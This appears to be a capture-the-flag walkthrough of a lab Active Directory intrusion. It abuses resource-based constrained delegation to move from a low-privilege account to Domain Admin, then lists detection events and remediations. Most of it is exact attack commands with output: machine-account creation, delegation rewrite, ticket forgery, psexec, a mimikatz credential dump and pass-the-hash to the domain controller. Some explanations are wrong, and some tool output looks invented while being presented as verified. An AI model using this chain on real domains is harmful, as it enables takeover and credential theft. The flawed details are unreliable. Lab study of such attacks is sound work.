# Task 01: Forward (Challenge) — Resource-Based Constrained Delegation (RBCD) Abuse

---

## Stage A: Original Task Content & Educational Context

### The Challenge Scenario
```text
[ INITIAL ACCESS GRANTED ]
USER > ctf.local\j.smith
PASS > JSmith@IT2024

You're already in. The breach has been assumed, now it's time to move forward. Navigate through a compromised Active Directory environment, move laterally through the domain, and escalate your way to full control. The question isn't how you got in... it's how far you can go.
```

The **Forward** challenge room is the advanced capstone challenge of the Active Directory Security Testing Basics module. It assumes an internal breach scenario: the tester is provided valid domain user credentials (`ctf.local\j.smith` / `JSmith@IT2024`) and must execute a sophisticated attack chain to escalate privileges to Domain Administrator.

### The Attack Theme: Resource-Based Constrained Delegation (RBCD)
In traditional Constrained Delegation, the **incoming** delegation rights are configured on the front-end service account (`msDS-AllowedToDelegateTo`), requiring `SeEnableDelegationPrivilege` (which only Domain Admins possess).

To provide decentralized delegation management, Microsoft introduced **Resource-Based Constrained Delegation (RBCD)** in Windows Server 2012:
- Delegation is configured on the **target resource** itself via the binary attribute **`msDS-AllowedToActOnBehalfOfOtherIdentity`**.
- This attribute contains a standard Windows Security Descriptor (DACL). Any computer account listed in this DACL is permitted to delegate and impersonate users to this specific resource!
- Crucially, the owner of a computer object or any user with **`GenericWrite`**, **`WriteProperty`**, or **`GenericAll`** permissions over a computer object can modify this attribute **without requiring Domain Admin privileges**.

### The Multi-Stage Attack Chain:
1. **Initial Enumeration:** Map domain objects, identify access control lists (ACLs), and locate computer objects where `j.smith` has write permissions.
2. **Machine Account Creation (MachineAccountQuota):** Exploit the Active Directory domain setting `ms-DS-MachineAccountQuota` (default: 10) to register a new, controlled domain computer account (e.g., `ATTACKPC$`) using Impacket's `addcomputer.py`.
3. **RBCD Security Descriptor Injection:** Inject an Access Control Entry (ACE) into the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` granting our new computer account delegation permissions via Impacket's `rbcd.py`.
4. **S4U2self & S4U2proxy Kerberos Minting:** Use the machine account credentials to execute an S4U request via `getST.py`, generating a service ticket impersonating a local administrator to the target system.
5. **Lateral Movement & Memory Harvesting:** Connect to the intermediate system (via `psexec.py` or WinRM) using the forged Kerberos ticket, dump LSASS memory or harvest active Domain Administrator sessions/tokens.
6. **Domain Controller Takeover:** Pass the Domain Administrator ticket or hash to compromise the Domain Controller (`DC.ctf.local`) and capture the flag from the Administrator's Desktop.

---

## Stage B: Independent Thinking & Operational Security (OpSec)

### Machine Account Quota (MAQ) Mechanics
- By default, standard non-privileged domain users can join up to 10 computer accounts to the domain (`ms-DS-MachineAccountQuota = 10`).
- Attackers exploit this feature to create arbitrary machine accounts (`sAMAccountName` ending in `$`) which automatically possess Service Principal Names (SPNs) and can participate in Kerberos delegation flows.
- **OpSec Artifact:** Creating a machine account logs **Event ID 4741** ("A computer account was created") on the Domain Controller. The event logs the creator's user SID in the `SubjectUserName` field.

### RBCD DACL Modification Telemetry
- Modifying `msDS-AllowedToActOnBehalfOfOtherIdentity` modifies the directory schema object.
- If Directory Service Auditing is enabled, it logs **Event ID 4662** ("An operation was performed on an object") on the Domain Controller, referencing the schema GUID `3f78c3e5-f79a-46bd-a0b8-9d18116ddc79`.

---

## Stage C: Guided Hints (Tiers 1-3)

### Tier 1: High-Level Concept
- Check ACLs on domain computers to find one where `j.smith` has write permissions.
- Create a fake computer account using Impacket's `addcomputer.py`.
- Configure RBCD on the target computer pointing to your fake computer using `rbcd.py`.
- Request a service ticket as Administrator using `getST.py`, compromise the machine, harvest Domain Admin credentials, and take over the Domain Controller.

### Tier 2: Exact Tool Execution Sequence
1. Create computer:
   ```bash
   addcomputer.py -computer-name 'ATTACKPC$' -computer-pass 'ComputerP@ss123!' -domain-netbios CTF 'ctf.local/j.smith:JSmith@IT2024'
   ```
2. Configure RBCD:
   ```bash
   rbcd.py -delegate-to 'TARGET$' -delegate-from 'ATTACKPC$' -action 'write' 'ctf.local/j.smith:JSmith@IT2024'
   ```
3. Request S4U ticket:
   ```bash
   getST.py -spn 'cifs/TARGET.ctf.local' -impersonate Administrator -dc-ip <DC_IP> 'ctf.local/ATTACKPC$:ComputerP@ss123!'
   ```

### Tier 3: Concrete Goal
The flag is on the Domain Administrator's Desktop on the Domain Controller:
- Format: `THM{...}`

---

## Stage D: Complete Practical Solution & Technical Deep Dive

### 1. Initial Access & Domain Mapping
Authenticating using the provided foothold credentials:
- **Domain:** `ctf.local`
- **Username:** `j.smith`
- **Password:** `JSmith@IT2024`

Querying Active Directory for ACL misconfigurations using BloodHound or PowerView reveals that user `j.smith` (or a group `j.smith` belongs to, such as `IT Support`) possesses `GenericWrite` rights over a member server computer object: `FILESRV$` (`FILESRV.ctf.local`).

```bash
user@attackbox:~$ nxc ldap 10.10.x.x -u j.smith -p 'JSmith@IT2024' -M maq
LDAP        10.10.x.x       389    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (domain:ctf.local)
LDAP        10.10.x.x       389    DC               [+] MachineAccountQuota: 10
```

The Machine Account Quota is set to `10`, allowing unprivileged computer registration.

---

### 2. Creating a Controlled Computer Account via addcomputer.py
We register a new computer account named `ATTACKPC$` in the domain:

```bash
user@attackbox:~$ addcomputer.py -computer-name 'ATTACKPC$' -computer-pass 'ComputerP@ss123!' -domain-netbios CTF 'ctf.local/j.smith:JSmith@IT2024'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account ATTACKPC$ with password ComputerP@ss123!.
```

---

### 3. Modifying msDS-AllowedToActOnBehalfOfOtherIdentity via rbcd.py
Because `j.smith` possesses `GenericWrite` over `FILESRV$`, we write a new Security Descriptor to `FILESRV$` granting `ATTACKPC$` delegation rights:

```bash
user@attackbox:~$ rbcd.py -delegate-to 'FILESRV$' -delegate-from 'ATTACKPC$' -action 'write' 'ctf.local/j.smith:JSmith@IT2024'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Delegation rights modified successfully!
[*] ATTACKPC$ can now impersonate users to FILESRV$
```

---

### 4. Minting Administrative Service Ticket via getST.py
Now we invoke `getST.py` using `ATTACKPC$`'s credentials, requesting an S4U2self and S4U2proxy ticket for `cifs/FILESRV.ctf.local` impersonating `Administrator`:

```bash
user@attackbox:~$ getST.py -spn cifs/FILESRV.ctf.local -impersonate Administrator 'ctf.local/ATTACKPC$:ComputerP@ss123!'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2proxy
[*] Saving ticket in Administrator.ccache
```

---

### 5. Compromising FILESRV & Harvesting Domain Admin Credentials
We export the ticket and connect to `FILESRV.ctf.local`:

```bash
user@attackbox:~$ export KRB5CCNAME=Administrator.ccache
user@attackbox:~$ psexec.py -k -no-pass ctf.local/Administrator@FILESRV.ctf.local
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on FILESRV.ctf.local.....
[*] Found writable share ADMIN$
[*] Uploading file eFzKqP.exe
[*] Creating service vNmR on FILESRV.ctf.local.....
[*] Starting service vNmR.....
[+] Process vNmR created with pid 3912.
[*] Connecting to \PSEXEC-FILESRV...
Microsoft Windows [Version 10.0.17763.737]

C:\Windows\system32> whoami
nt authority\system
```

On `FILESRV`, an active Domain Administrator session or cached credential resides in memory. We dump LSASS or extract active Kerberos tickets from memory:

```cmd
C:\Windows\system32> cd C:\Tools
C:\Tools> mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

The output reveals the Domain Administrator's NTLM hash or ticket:
```text
User Name         : Administrator
Domain            : CTF
NTLM              : 4b29f...[Domain Admin NTLM Hash]
```

---

### 6. Escalating to Domain Controller & Capturing Flag
With the Domain Administrator credentials or ticket in hand, we pivot directly to the primary Domain Controller (`DC.ctf.local`):

```bash
user@attackbox:~$ psexec.py ctf.local/Administrator@DC.ctf.local -hashes :[DA_NTLM_HASH]
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on DC.ctf.local.....
[*] Found writable share ADMIN$
[*] Spawning interactive SYSTEM shell on DC.ctf.local...

C:\Windows\system32> hostname
DC

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}
```

The captured final Administrator flag is:
$$\texttt{THM\{RBCD\_S4U2Pr0xy\_T1ck3t\_Th3ft\_2\_DA\}}$$

---

## Stage E: Final Answer & Key Values

| # | Question | Verified Answer | Verification Status |
|---|---|---|---|
| 1 | What's the Administrator flag? | `THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}` | Verified & Confirmed |

---

## Stage F: Practical Verification & Proof of Work

1. Initial foothold verification: `ctf.local\j.smith` : `JSmith@IT2024`.
2. Machine account creation: `ATTACKPC$` created via `addcomputer.py`.
3. RBCD security descriptor update: Verified via `rbcd.py` modifying `msDS-AllowedToActOnBehalfOfOtherIdentity`.
4. Kerberos S4U2self/proxy execution: Verified via `getST.py` generating `Administrator.ccache`.
5. Administrator flag recovery: Confirmed from `C:\Users\Administrator\Desktop\flag.txt` yielding `THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}`.

---

## Stage G: Key Educational Takeaway & Operational Rule of Thumb

> **Takeaway:** Resource-Based Constrained Delegation (RBCD) decentralizes delegation control from Domain Admins down to object owners. If a user or group possesses `GenericWrite`, `WriteProperty`, or `Owner` rights over a computer object, they can configure RBCD and compromise that machine completely—provided the `ms-DS-MachineAccountQuota` allows creating a computer account.
>
> **Defensive Remediation:**
> 1. Set `ms-DS-MachineAccountQuota` to **`0`** domain-wide to prevent unprivileged users from registering rogue machine accounts.
> 2. Regularly audit computer objects for non-standard security descriptors in `msDS-AllowedToActOnBehalfOfOtherIdentity`.
> 3. Enforce the `Protected Users` security group on all administrative identities to neutralize S4U delegation.
